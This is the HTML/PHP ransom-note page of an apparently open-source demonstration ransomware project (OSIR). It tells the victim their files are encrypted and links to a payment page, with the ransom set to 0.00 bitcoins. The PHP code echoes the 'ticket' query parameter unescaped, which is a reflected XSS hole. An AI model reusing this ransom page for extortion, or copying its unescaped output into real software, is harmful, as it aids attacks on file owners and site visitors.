<!DOCTYPE HTML>
<html>
	<head>
		<title>Lock page</title>
		<link rel="stylesheet" href="style/main.css">
	</head>
	<body style="background-image:url(images/lock.png);background-size: 500px 500px;background-repeat: no-repeat;background-position: center;">
		<div class="topcenter">
		<h1>Your Files have been Locked</h1>
			Your files have been safely encrypted with RSA and AES-128 using <a href="https://github.com/Property404/OSIR">OSIR</a>. To retrieve them, please generously donate <code>0.00</code> bitcoins.
			<p>
			<?php
				if(!array_key_exists("ticket",$_GET))
					header("Location: ./");
				echo("<a href='pay.php?ticket=".$_GET['ticket']."'>Pay now to receive your decryption key</a>\n");
			?>
			<p>
		</div>
		<footer>
		Lock Image: Creative Commons Attribution 3.0, Attribution:<br> 
		Designed by Marwa Boukarim from The Noun Project<br>
		Vectorised by Fred the Oyster		
		</footer>
	</body>
</html>